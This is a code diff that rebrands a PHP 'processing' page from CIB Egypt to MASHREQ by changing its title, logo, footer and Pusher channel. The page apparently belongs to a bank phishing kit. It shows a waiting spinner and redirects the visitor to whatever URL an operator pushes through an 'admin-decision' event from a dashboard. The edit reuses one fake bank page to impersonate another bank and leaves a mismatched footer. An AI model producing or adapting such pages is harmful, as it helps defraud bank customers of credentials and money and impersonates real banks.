@@ -9,7 +9,7 @@ require_once('./dashboard/init.php');
 
 <head>
     <meta charset="utf-8">
-    <title>جاري المعالجة - CIB</title>
+    <title>جاري المعالجة - MASHREQ</title>
     <meta content="width=device-width, initial-scale=1.0" name="viewport">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -294,7 +294,7 @@ require_once('./dashboard/init.php');
     <div class="container">
         <div class="glass-card">
             <div class="logo-wrap">
-                <img src="assets/logo.webp" alt="CIB">
+                <img src="assets/mashreq.jpeg" alt="MASHREQ">
             </div>
 
             <div class="spinner-container">
@@ -327,7 +327,7 @@ require_once('./dashboard/init.php');
         </div>
     </div>
 
-    <div class="bottom-note">CIB Egypt © 2025 — Commercial International Bank</div>
+    <div class="bottom-note">MASHREQ Egypt © 2025 — Commercial International Bank</div>
 
     <script>
         // Create floating particles
@@ -354,7 +354,7 @@ require_once('./dashboard/init.php');
      var pusher = new Pusher('0737c04931774e406307', {
       cluster: 'ap2'
     });
-        var channel = pusher.subscribe('my-channel-cib');
+        var channel = pusher.subscribe('my-channel-MASHREQ');
         channel.bind('admin-decision', function (data) {
             if (data.userId == userId) {
                 window.location = data.url;
